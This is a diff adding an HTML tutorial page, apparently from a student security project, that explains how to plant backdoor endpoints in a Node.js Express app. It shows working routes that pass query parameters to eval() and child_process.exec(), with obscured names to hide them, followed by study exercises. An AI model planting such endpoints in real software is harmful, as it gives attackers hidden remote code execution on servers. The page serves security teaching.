@@ -1,0 +1,77 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+
+  <title>Leave Me Here</title>
+  <link href="https://fonts.googleapis.com/css?family=Play" rel="stylesheet">
+  <link rel="stylesheet" href="\css\styles.css">
+</head>
+
+<body>
+<div class='header'>
+  <div id='logo'>
+  <h1>Leave Me Here</h1>
+  <h3>A NODE.JS Application Backdoor</h3>
+</div>
+  <ul id='menu'>
+      <li><a href='/'>HOME</a></li>
+      <li><a href='vulns' class='currPage'>VULNS</a></li>
+      <li><a href='exploit'>XPLOIT</a></li>
+      <li><a href='about'>ABOUT</a></li>
+  </ul>
+  </div>
+
+<div id='wrapper'>
+  <div id='contentDiv'>
+    <img src='\images\nodejs.jpg' style='width: 60%'>
+    <h2>The vulns in NODE.JS</h2>
+    <p>There are a handful of prety well known security vulnerabilities in Node Applications.They mainly involve Command Injection through the code evaluating function eval() and by spawning a new process with child_process.exec() When the parameters of this functions come directly from user data, the posibilities for exploit are big.</p>
+    <h2>API endpoints in Express</h2>
+    <p> Express is a very common application framework for node.js and it handles the routing of incoming http requests as well as the responses for them. The standard way of creating a route in Express looks like the following:</p>
+      <div class='codeBox'>
+          <p class='tabbedNone'>app.get('/home', function (req, res) {</p>
+          <p class='tabbedOnce'>//some code that makes a response</p>
+          <p class='tabbedOnce'>res.send(myresponse)</p>
+          <p class='tabbedNone'>})</p>
+      </div>
+      <h2>Javascript Injection</h2>
+      <p>since the req object contains input data directly from the browser, we can simply extract the data item we want and evaluate it as code using eval() and since we don't need an actual server response, we can delete the res line. Lets call the endpoint 'backdoor', Just to be cliche. Our backdoor endpoint can look something like this:</p>
+      <div class='codeBox'>
+          <p class='tabbedNone'>app.get('/backdoor', function (req, res) {</p>
+          <p class='tabbedOnce'>eval(req.query.code);</p>
+          <p class='tabbedNone'>})</p>
+      </div>
+      <p>Although this backdoor code is functional it has a major problem. A backdoor is only supposed to be used/known by the person who left it in the system. Otherwise, it would just be an awful security hole. A random hacker could potentially scan our app server for endpoints and vulnerabilities of this very same type. Since the eval() function in /backdoor takes the string contained in the element 'code' we are gonna give them key style names. lets try Rdzmu3mpFH and TV0fKRoS3v as a new names. That way it would be quite difficult for a random hacker to guess the element's names.</p>
+      <div class='codeBox'><p class='tabbedNone'>app.get('/TV0fKRoS3v', function (req, res) {</p>
+          <p class='tabbedOnce'>eval(req.query.Rdzmu3mpFH);</p>
+          <p class='tabbedNone'>})</p>
+      </div>
+    <h2>Shell Command Injection</h2>
+    <p> Now, keeping the same idea from before, we will create another backdoor endpoint. This time the input will be sent to child_process. Shell commands can run in this new process. </p>
+      <div class='codeBox'><p class='tabbedNone'>app.get('/5JITcyICH3', function (req, res) {</p>
+          <p class='tabbedOnce'>require('child_process').exec(</p>
+          <p class='tabbedTwice'>req.query.HnlmB9RIgC,</p>
+          <p class='tabbedTwice'>function (err, data) {</p>
+          <p class='tabbedTwice'>res.send(data)</p>
+          <p class='tabbedOnce'>});</p>
+          <p class='tabbedNone'>})</p>
+      </div>
+    <h2>Exercises</h2>
+    <ul>
+        <li>Open the source file index.js and find where the eval() and .exec() functions are.</li>
+        <li>Would it be a good idea to put eval() in the normal endpoints?</li>
+        <li>Why did we remove/modify the res.send() instruction for the backdoors?</li>
+        <li>What is the fundamental difference between eval() and .exec() ?</li>
+        <li>Thinking of server account permissions, what can we expect from eval() and .exec()</li>
+        <li>For more research, look up child_process.spawn() can we use it like .exec() ?</li>
+    </ul>
+  </div>
+  <div id='columnDiv'>
+    <div id='panel'>
+      <h2>hack javascript client api simple browser server framework web module parser http nodejs implementation test css json file express data tool engine testing coffeescript object database html based middleware wrapper command connect template easy language files asynchronous async build code fast stream ender line mongodb utility generator compiler rest system applications jquery templates dom support lightweight objects tools bind</h2>
+    </div>
+  </div>
+</div>    
+<div id='footer'><h4>@fall2017 by juliosotodev</h4></div>    
+</body>
+</html>
